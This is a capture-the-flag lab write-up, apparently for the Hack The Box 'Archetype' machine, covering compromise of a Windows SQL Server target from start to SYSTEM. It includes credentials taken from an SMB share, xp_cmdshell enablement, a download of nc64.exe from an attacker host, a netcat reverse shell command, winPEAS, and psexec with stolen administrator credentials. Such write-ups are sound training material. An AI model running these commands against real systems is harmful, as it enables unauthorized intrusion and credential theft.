# Archetype

## Enumeration

### nmap

```
PORT     STATE SERVICE      REASON  VERSION
135/tcp  open  msrpc        syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds syn-ack Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     syn-ack Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-27T18:00:09
| Not valid after:  2051-10-27T18:00:09
| MD5:   45c3 f5c5 2ac3 a012 c007 54e9 3e30 ea2f
| SHA-1: b273 4655 3292 56a9 f773 d0f5 b41f d92e 19bd 213c
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQHkXZ7d4ZOL1MPvLX3qbihzANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjExMDI3MTgwMDA5WhgPMjA1MTEwMjcxODAwMDlaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANMXJSH9
| fdlYeji01TVoR8NCUNyjsnqrmT7jRMSC40u5o2nP4jMQs72xTfgrIAL5Fu6VZAHg
| ju0s2aUtoK6sHJbQkLkqZ+2MFBgr+7ExEt0ITJ5sveFMImlPIsc70jfeb1lJesHQ
| N+0Cg4QwHnZX8R3s2IxhhNpT+RPSMf3909hISOrtCFXGg2hzldxsKtqWtnzPbVXn
| aMj6leXPuPQJSkSP/ib1gELxxI5UU1UsKrZMAzPNemTLMLor9ftLgVV13zG2PDyB
| jOrk8wtuqa6/mz2eoTk6tzkyMlX/VEtwPK++qIAm/UFTtsaVojC4MJhtD3fy5rUx
| smVYqh7Cb+Agc6kCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAFYLGaTvLkXo3cL5p
| broJjANQKMlGeTRqVuZKFNKXQl40NzP0SEtW51P0XKPMvXaerSCEYR6muWhSuEDI
| +/Y5L3XuSf9mdF2lZLdAjNuSCcSSxZODc/Tpmzd9+0MKCPeB104q9rWwEuQYrS0k
| f14e7Vv3Vb1nJQLR5W4ankyRrCFgOcQPMmZJgkltAqzxnHKuGNrOv9ivQkHWB5Qn
| eoMaqtpysJ8TwS5+DGhwJ99FmmcBq1+FrsO8PxsBzFW7YXb3YqQCxmuXq4pqNNmz
| 4iAb3BHYlD3tQZnpyqWf/dnd55apa3E+kScm7aNgU2BiGLsndfBeK5BlTuC4rzLU
| X+0Ngw==
|_-----END CERTIFICATE-----
|_ssl-date: 2021-10-27T18:05:21+00:00; +12m17s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info:
|   10.129.95.187:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 6846/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 30913/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 53199/udp): CLEAN (Timeout)
|   Check 4 (port 4389/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-10-27T11:05:09-07:00
| smb2-time:
|   date: 2021-10-27T18:05:10
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_clock-skew: mean: 1h36m16s, deviation: 3h07m50s, median: 12m16s
```

### smbclient

```
$smbclient -L \\\\10.129.95.187
Enter WORKGROUP\nair0lf32's password:

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

First smb shares

only `backups` share was accessible

`$smbclient -N \\\\10.129.95.187\\backups`

inside that we get `prod.dtsConfig` file with an interresting part here

```
...
Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
```

Nmap says a mssql server is up

We use `mssqlclient` to connect to the server with creds we got

impacket tools are great though

`python3 mssqlclient.py ARCHETYPE\sql_svc@10.129.95.187 -windows-auth`

ok I made a typo in the username (its a windows domain)

the username should be changed to this:

`ARCHETYPE/sql_svc` (anti-slash)

```
password:
M3g4c0rp123

Access granted
SQL> help

lcd {path} - changes the current local directory to {path}
exit - terminates the server process (and this session)
enable_xp_cmdshell - you know what it means
disable_xp_cmdshell - you know what it means
xp_cmdshell {cmd} - executes cmd using xp_cmdshell
sp_start_job {cmd} - executes cmd using the sql server agent (blind)
! {cmd} - executes a local shell cmd

SQL> SELECT is_srvrolemember('sysadmin');

---

1 (means TRUE)
```

We are sysadmin baby

```
SQL> EXEC xp_cmdshell'net_user';
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

SQL> Exec sp_configure 'show advanced options',1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL> RECONFIGURE;
SQL> sp_configure;
name minimum maximum config_value run_value
...
xp_cmdshell 0 1 0 0
...
---
```

```
SQL> EXEC sp_configure 'xp_cmdshell',1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;

SQL> xp_cmdshell "whoami"
output

---

archetype\sql_svc

NULL
```

Now uploading nc64 (downloaded) to get a stable reverse shell

used a python server for upload and netcat to catch incoming connection on port 443

current directory

```
SQL> xp_cmdshell "powershell -c pwd"
output

---

NULL

Path

---

C:\Windows\system32

NULL

NULL

NULL
```

Uploading

```
SQL> xp_cmdshell "powershell -c cd C:\users\sql_svc\Downloads; wget http://10.10.14.230/nc64.exe -outfile nc64.exe"
```

Actiation of reverse shell

```
SQL> xp_cmdshell "powershell -c cd C:\users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.230 443"
```

Initial access succeed

```
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\users\sql_svc\Downloads>cd ..
cd ..

C:\Users\sql_svc>dir
dir
Volume in drive C has no label.
Volume Serial Number is 9565-0B4F

Directory of C:\Users\sql_svc

01/20/2020 06:01 AM <DIR> .
01/20/2020 06:01 AM <DIR> ..
01/20/2020 06:01 AM <DIR> 3D Objects
01/20/2020 06:01 AM <DIR> Contacts
01/20/2020 06:42 AM <DIR> Desktop
01/20/2020 06:01 AM <DIR> Documents
10/27/2021 04:39 PM <DIR> Downloads
01/20/2020 06:01 AM <DIR> Favorites
01/20/2020 06:01 AM <DIR> Links
01/20/2020 06:01 AM <DIR> Music
01/20/2020 06:01 AM <DIR> Pictures
01/20/2020 06:01 AM <DIR> Saved Games
01/20/2020 06:01 AM <DIR> Searches
01/20/2020 06:01 AM <DIR> Videos
0 File(s) 0 bytes
14 Dir(s) 10,710,228,992 bytes free

C:\Users\sql_svc>cd Desktop
C:\Users\sql_svc\Desktop>dir
dir
Volume in drive C has no label.
Volume Serial Number is 9565-0B4F

Directory of C:\Users\sql_svc\Desktop

01/20/2020 06:42 AM <DIR> .
01/20/2020 06:42 AM <DIR> ..
02/25/2020 07:37 AM 32 user.txt
1 File(s) 32 bytes
2 Dir(s) 10,710,228,992 bytes free

C:\Users\sql_svc\Desktop>type user.txt
type user.txt
```

First FLAG FOUND

## Privilege Escalation

We use winpeas

```
C:\Users\sql_svc\Downloads>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\sql_svc\Downloads> wget http://10.10.14.230/winPEASx64.exe -outfile winPEASx64.exe
wget http://10.10.14.230/winPEASx64.exe -outfile winPEASx64.exe

PS C:\Users\sql_svc\Downloads> ./winPEASx64.exe
```

put Output in a separate file (`winPEaS-results.txt`) due to HYPERverbosity but one nice part is:

```
����������͹ Analyzing Windows Files Files (limit 70)
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\Users\Default\NTUSER.DAT
C:\Users\sql_svc\NTUSER.DAT

PS C:\users\sql_svc\Downloads> cd ..
cd ..
PS C:\users\sql_svc> cd AppData
cd AppData
PS C:\users\sql_svc\AppData> cd Roaming\Microsoft\Windows
cd Roaming\Microsoft\Windows
PS C:\users\sql_svc\AppData\Roaming\Microsoft\Windows> cd Powershell
cd Powershell
PS C:\users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell> cd PSReadline
cd PSReadline
PS C:\users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline>
PS C:\users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline> dir
dir

Directory: C:\users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline

Mode LastWriteTime Length Name

---

-ar--- 3/17/2020 2:36 AM 79 ConsoleHost_history.txt
```

Found `ConsoleHost_history.txt` file

```
PS C:\users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline> type ConsoleHost_history.txt
type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

Now we got administrator creds

we use psexec.py from impacket to get new access

`$python3 psexec.py administrator@10.129.95.187`

```
Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.95.187.....
[*] Found writable share ADMIN$
[*] Uploading file JxrXPcpX.exe
[*] Opening SVCManager on 10.129.95.187.....
[*] Creating service wFLN on 10.129.95.187.....
[*] Starting service wFLN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

C:\Windows\system32> whoami
nt authority\system
```

Victory

```
C:\Windows\system32> cd C:\Users\Administrator

C:\Users\Administrator> dir
Volume in drive C has no label.
Volume Serial Number is 9565-0B4F

Directory of C:\Users\Administrator

01/19/2020 11:39 PM <DIR> .
01/19/2020 11:39 PM <DIR> ..
07/27/2021 02:30 AM <DIR> 3D Objects
07/27/2021 02:30 AM <DIR> Contacts
07/27/2021 02:30 AM <DIR> Desktop
07/27/2021 02:30 AM <DIR> Documents
07/27/2021 02:30 AM <DIR> Downloads
07/27/2021 02:30 AM <DIR> Favorites
07/27/2021 02:30 AM <DIR> Links
07/27/2021 02:30 AM <DIR> Music
07/27/2021 02:30 AM <DIR> Pictures
07/27/2021 02:30 AM <DIR> Saved Games
07/27/2021 02:30 AM <DIR> Searches
07/27/2021 02:30 AM <DIR> Videos
0 File(s) 0 bytes
14 Dir(s) 10,704,728,064 bytes free

C:\Users\Administrator> cd Desktop

C:\Users\Administrator\Desktop> dir
Volume in drive C has no label.
Volume Serial Number is 9565-0B4F

Directory of C:\Users\Administrator\Desktop

07/27/2021 02:30 AM <DIR> .
07/27/2021 02:30 AM <DIR> ..
02/25/2020 07:36 AM 32 root.txt
1 File(s) 32 bytes
2 Dir(s) 10,704,728,064 bytes free

C:\Users\Administrator\Desktop> type root.txt
```

And we are done here. For a startin point machine it was pretty solid
